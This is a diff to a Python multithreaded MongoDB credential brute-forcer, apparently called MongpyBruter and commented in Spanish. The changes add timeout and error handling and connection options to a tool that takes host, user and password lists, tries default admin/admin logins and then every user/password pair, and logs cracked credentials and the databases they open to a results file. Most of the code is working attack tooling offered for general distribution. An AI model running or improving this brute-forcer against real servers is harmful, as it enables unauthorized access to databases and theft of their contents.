@@ -7,6 +7,7 @@ __email__="hacknautilus@protonmail.com"
 Este programa es de libre distribucion, te invito a compartirlo y mejorarlo
 '''
 
+from tracemalloc import stop
 import pymongo
 import argparse
 import pathlib
@@ -21,7 +22,13 @@ from tqdm import tqdm
 totalHosts=0
 totalHostsErrors=0
 
+found_credentials = False
+
 class MongpyBruter(threading.Thread):
+    
+    global found_credentials
+
+    found_credentials=False
 
     def __init__(
         self,
@@ -32,20 +39,23 @@ class MongpyBruter(threading.Thread):
         threading.Thread.__init__(self)
         self.jobs = jobs
         self.foundHosts=0
-        self.maxSevSelDelay=1000
+        self.maxSevSelDelay=5000
+        self.credentials_found = False            
 
+
+   
 
     def run(self):
 
         self.running = True
-
+        
         while self.running:
             try:
 
                 host, username, password = self.jobs.get(False)
 
             except queue.Empty:
-                time.sleep(0.1)
+                time.sleep(0.2)
                 continue
 
             mongoUriString="mongodb://"+host+"/"
@@ -66,8 +76,10 @@ class MongpyBruter(threading.Thread):
                     with open("mongo_user_pass_result.txt", "a") as myfile:
                         myfile.write( "Host: "+ host + " ( usuario: " +username+" y contrasenia: "+password+ ") DB:"+ str(databases))
                     self.jobs.task_done()
-                           
-              
+                    self.jobs.empty()
+                
+                       
+               
 
  
 
@@ -80,9 +92,13 @@ class MongpyBruter(threading.Thread):
                     pass
                  else:
                     pass
-  
+            except pymongo.errors.NetworkTimeout as e:
+                  print("Time Network error")  
             except Exception as e:
-                pass
+                  print("Other error: {}".format( str(e) ))
+                  self.jobs.task_done()
+                 
+
             
 
 
@@ -127,7 +143,7 @@ def results():
 def checkHost(host)->bool:
     '''Verificar la disponibilidad del host'''
     try:
-      mongoUriString="mongodb://"+host+"/"
+      mongoUriString="mongodb://"+host+"/?authSource=admin&readPreference=primary&directConnection=true&ssl=false"
       client=pymongo.MongoClient(mongoUriString,serverSelectionTimeoutMS=1000,username="admin",password="admin")
 
       time.sleep(0.8)
@@ -135,6 +151,7 @@ def checkHost(host)->bool:
       databases=client.list_database_names()
      
       return True
+      
     except (pymongo.errors.ConnectionFailure):
         return False
     except pymongo.errors.OperationFailure as e:
@@ -142,8 +159,13 @@ def checkHost(host)->bool:
          if e.code == 18 or 'auth fails' in msg:
             # Auth failed.
             return True
-    except pymongo.errors.ConfigurationError as e:
+    except pymongo.errors.ConfigurationError as e: 
             return False
+    except pymongo.errors.NetworkTimeout as e:
+            return False                       
+    except:
+            return False        
+     
 
 def main():
 
@@ -177,7 +199,7 @@ def main():
             hosts = h.readlines()
             for host in tqdm(hosts, leave=True):
                 if checkHost(host.strip()):
-                    
+                    print("Current host {}".format(host.strip()))
                     for thread_id in range(args.threads):
                         thread = MongpyBruter(jobs)
                         thread.name = str(thread_id)
@@ -185,15 +207,16 @@ def main():
                         thread_pool.append(thread)
 
                     with args.users.open("r") as u:
-             
-                            with args.users.open("r") as u:
-                                users = u.readlines()
-                                with args.passwords.open("r") as p:
-                                    passwords = p.readlines()
-                                    for usuario in users:
                             
+                        with args.users.open("r") as u:
+
+                            users = u.readlines()
+                            with args.passwords.open("r") as p:
+                                passwords = p.readlines()
+                                for usuario in users:
+                                      
                                         for password in passwords:    
-                                         
+                                        
                                             jobs.put(
                                                 (
                                                     host.strip(),
@@ -203,7 +226,6 @@ def main():
                                                 )
                                             )                
                                     
-  
                 try:
                     while not jobs.empty():
                         #for thread in thread_pool:
